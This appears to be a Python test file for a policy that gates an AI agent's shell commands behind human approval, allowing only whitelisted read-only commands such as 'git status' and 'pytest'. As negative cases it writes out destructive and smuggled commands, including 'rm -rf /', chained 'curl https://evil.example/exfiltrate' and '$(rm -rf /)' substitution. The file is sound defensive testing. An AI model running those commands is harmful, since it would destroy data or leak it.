#!/usr/bin/env python3
"""Tests for RANK9_HEADLESS_BASH_NARROW_GRANT in authority_policy.py.

WHAT THIS CLOSES: authority_policy.classify() previously treated ANY
request for the "Bash" tool as unconditionally FOUNDER_GATED (GATED_TOOLS),
with no way for an ordinary, already-approved WorkItem to run a benign
command (e.g. `pytest`, `git status`) unattended -- this was the Rank 9
Bash headless-approval gap, confirmed by read-only investigation
2026-09-09. Founder decision (same date) approved a narrow fix: a Bash
request is exempted from that unconditional escalation ONLY when the
caller declares the exact literal command(s) up front (`bash_commands`,
never inferred from task_description) and every one passes
_bash_command_is_safe()'s whitelist-only check.

WHAT THIS DELIBERATELY DOES NOT DO: it never removes "Bash" from
GATED_TOOLS, never widens GATED_KEYWORDS/GATED_PATH_MARKERS/GATED_ADAPTERS,
and never grants the bare string "Bash" through this path -- only scoped
"Bash(<command>:*)" entries for the exact verified command(s). Every test
below proves at least one of those boundaries holds.

Run: python3 tests/test_authority_policy_rank9_bash.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import authority_policy as ap  # noqa: E402

FAILURES: list[str] = []


def check(name: str, condition: bool, detail: str = "") -> None:
    status = "PASS" if condition else "FAIL"
    print(f"[{status}] {name}" + (f" — {detail}" if detail and not condition else ""))
    if not condition:
        FAILURES.append(name)


SANDBOX = Path("/opt/pulse5-core/mrsilent_bridge/jobs/_test_authority_policy_sandbox/workdir")


def _classify(task: str, bash_commands, tools=frozenset({"Bash"}), **kw):
    return ap.classify(task, set(tools), SANDBOX, bash_commands=bash_commands, **kw)


# --------------------------------------------------------------------- #
# Positive: safe, read-only/deterministic-test commands run headless
# --------------------------------------------------------------------- #
def test_git_status_runs_headless() -> None:
    d = _classify("check repo status", ["git status"])
    check("plain 'git status' is LOW risk and not founder-gated",
          d.risk_class == ap.RiskClass.LOW and d.may_execute, f"{d.risk_class} {d.reasons}")
    check("granted_tools contains a scoped Bash(git status:*) entry, not bare 'Bash'",
          "Bash(git status:*)" in d.granted_tools and "Bash" not in d.granted_tools, d.granted_tools)


def test_git_diff_with_safe_flags_runs_headless() -> None:
    d = _classify("show the diff", ["git diff --stat"])
    check("'git diff --stat' is LOW risk", d.risk_class == ap.RiskClass.LOW, f"{d.risk_class} {d.reasons}")
    check("scoped grant present", "Bash(git diff --stat:*)" in d.granted_tools, d.granted_tools)


def test_git_log_runs_headless() -> None:
    d = _classify("show recent history", ["git log --oneline -10"])
    check("'git log --oneline -10' is LOW risk", d.risk_class == ap.RiskClass.LOW, f"{d.risk_class} {d.reasons}")


def test_pytest_runs_headless() -> None:
    d = _classify("run the regression suite", ["pytest -q tests/test_fast_response_worker.py"])
    check("'pytest -q <path>' is LOW risk", d.risk_class == ap.RiskClass.LOW, f"{d.risk_class} {d.reasons}")
    check("granted as scoped Bash(...) entry", any(g.startswith("Bash(pytest") for g in d.granted_tools), d.granted_tools)


def test_python3_module_pytest_runs_headless() -> None:
    d = _classify("run the test module", ["python3 -m pytest -q -k test_negated"])
    check("'python3 -m pytest -q -k expr' is LOW risk", d.risk_class == ap.RiskClass.LOW, f"{d.risk_class} {d.reasons}")


def test_multiple_declared_safe_commands_all_granted() -> None:
    d = _classify("inspect then test", ["git status", "pytest -q"])
    check("both declared commands verified safe -> LOW risk", d.risk_class == ap.RiskClass.LOW, f"{d.risk_class} {d.reasons}")
    check("both scoped grants present",
          "Bash(git status:*)" in d.granted_tools and "Bash(pytest -q:*)" in d.granted_tools, d.granted_tools)


def test_other_low_risk_tools_unaffected_alongside_safe_bash() -> None:
    d = _classify("inspect and read", ["git status"], tools={"Bash", "Read", "Grep"})
    check("Read/Grep alongside verified-safe Bash stays LOW", d.risk_class == ap.RiskClass.LOW, f"{d.risk_class} {d.reasons}")
    check("Read/Grep granted verbatim", {"Read", "Grep"} <= d.granted_tools, d.granted_tools)


# --------------------------------------------------------------------- #
# Negative: protected / side-effectful / unrecognized commands stay gated
# --------------------------------------------------------------------- #
def test_bare_bash_with_no_declared_commands_still_gated() -> None:
    d = _classify("do some shell work", None)
    check("Bash with no bash_commands declared is still FOUNDER_GATED",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")
    check("nothing granted", not d.may_execute, d.reasons)


def test_rm_rf_never_whitelisted() -> None:
    d = _classify("clean up", ["rm -rf /opt/pulse5-core"])
    check("'rm -rf ...' is FOUNDER_GATED (not on the whitelist)",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_curl_network_call_never_whitelisted() -> None:
    d = _classify("fetch something", ["curl https://example.com"])
    check("'curl ...' is FOUNDER_GATED (not on the whitelist -- no network calls)",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_systemctl_restart_never_whitelisted() -> None:
    d = _classify("restart a service", ["systemctl restart mrsilent-autonomous-cycle.timer"])
    check("'systemctl restart ...' is FOUNDER_GATED", d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_reboot_never_whitelisted() -> None:
    d = _classify("reboot", ["reboot"])
    check("'reboot' is FOUNDER_GATED", d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_pip_install_never_whitelisted() -> None:
    d = _classify("add a dependency", ["pip install requests"])
    check("'pip install ...' is FOUNDER_GATED (no installs/package changes)",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_chained_command_via_semicolon_rejected() -> None:
    """A safe prefix followed by an unsafe suffix must not smuggle the
    unsafe part through -- proves the shell-metacharacter check, not just
    the base-command whitelist, is load-bearing."""
    d = _classify("check status then wipe", ["git status; rm -rf /"])
    check("'git status; rm -rf /' is FOUNDER_GATED despite the safe prefix",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_chained_command_via_double_ampersand_rejected() -> None:
    d = _classify("chain", ["git status && curl https://evil.example/exfiltrate"])
    check("'git status && curl ...' is FOUNDER_GATED", d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_command_substitution_rejected() -> None:
    d = _classify("substitute", ["git status $(rm -rf /)"])
    check("command substitution '$(...)' is FOUNDER_GATED", d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_git_diff_ext_diff_flag_not_whitelisted() -> None:
    """git diff --ext-diff can invoke an arbitrary external diff driver --
    must be rejected for not being on the explicit flag whitelist, even
    though the base command ('git diff') is otherwise safe."""
    d = _classify("diff with external tool", ["git diff --ext-diff"])
    check("'git diff --ext-diff' is FOUNDER_GATED (flag not whitelisted)",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_git_global_config_override_not_whitelisted() -> None:
    """'git -c ...' shifts the subcommand position so it never matches
    ('git', 'status')/('git', 'diff') -- must fail closed, not match by
    accident."""
    d = _classify("diff with pager override", ["git -c core.pager=malicious diff"])
    check("'git -c ... diff' is FOUNDER_GATED (does not match the whitelisted base)",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_scorpio_keyword_still_gates_even_with_safe_bash() -> None:
    """A verified-safe Bash command must not bypass the completely
    unrelated, unchanged GATED_KEYWORDS scan on task_description."""
    d = _classify("modify the scorpio corner voice pipeline settings", ["git status"])
    check("Scorpio keyword in task text still FOUNDER_GATES the whole job, even with safe Bash declared",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_credential_keyword_still_gates_even_with_safe_bash() -> None:
    d = _classify("access credentials for the deploy step", ["pytest -q"])
    check("credential keyword still FOUNDER_GATES the whole job, even with safe Bash declared",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_gated_path_marker_still_gates_even_with_safe_bash() -> None:
    d = _classify("edit config", ["git status"])
    d2 = ap.classify(
        "edit config", {"Bash"}, SANDBOX,
        source_paths=[Path("/opt/pulse5-core/pulse-core/.env")],
        bash_commands=["git status"],
    )
    check("a GATED_PATH_MARKERS hit ('.env') still FOUNDER_GATES even with safe Bash declared",
          d2.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d2.risk_class} {d2.reasons}")


def test_gated_adapter_still_gates_even_with_safe_bash() -> None:
    d = ap.classify("run tests", {"Bash"}, SANDBOX, bash_commands=["pytest -q"], adapter="codex")
    check("a GATED_ADAPTERS provider (codex) still FOUNDER_GATES even with safe Bash declared",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_sandbox_jail_still_gates_even_with_safe_bash() -> None:
    d = ap.classify("run tests", {"Bash"}, Path("/tmp/outside_the_jail"), bash_commands=["pytest -q"])
    check("an out-of-jail sandbox_root still FOUNDER_GATES even with safe Bash declared",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_one_unsafe_command_gates_the_whole_batch() -> None:
    """If ANY declared command in the batch is unsafe, none are granted --
    proves partial exemption ('grant the safe ones, gate the rest') was
    deliberately not implemented, which would be a bare-Bash-adjacent
    smuggling path via a single always-safe-looking call."""
    d = _classify("mixed batch", ["git status", "rm -rf /"])
    check("one unsafe command in the batch keeps the whole job FOUNDER_GATED",
          d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")
    check("nothing granted", not d.may_execute, d.reasons)


def test_existing_gated_tools_members_unaffected() -> None:
    """WebFetch/WebSearch/Agent/NotebookEdit must be byte-for-byte
    unaffected by this change -- GATED_TOOLS itself was not modified."""
    for tool in ("WebFetch", "WebSearch", "Agent", "NotebookEdit"):
        d = ap.classify("do something", {tool}, SANDBOX)
        check(f"{tool} is still unconditionally FOUNDER_GATED",
              d.risk_class == ap.RiskClass.FOUNDER_GATED, f"{d.risk_class} {d.reasons}")


def test_founder_approved_override_still_available_and_unscoped() -> None:
    """The pre-existing human-override path (founder_approved=True for an
    otherwise-gated job) must still work exactly as before for a Bash
    request that was NOT verified via bash_commands."""
    d = ap.classify("do arbitrary shell work", {"Bash"}, SANDBOX, founder_approved=True)
    check("founder_approved=True still grants (pre-existing override, unrelated to this fix)",
          d.may_execute, f"{d.risk_class} {d.reasons}")
    check("unscoped bare 'Bash' is granted only via this explicit human override, as before",
          "Bash" in d.granted_tools, d.granted_tools)


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    for t in tests:
        try:
            t()
        except Exception as e:  # noqa: BLE001
            check(t.__name__, False, f"raised {e!r}")
    if FAILURES:
        print(f"\n{len(FAILURES)} FAILURE(S): {FAILURES}")
        sys.exit(1)
    print(f"\nALL {len(tests)} TESTS PASSED")
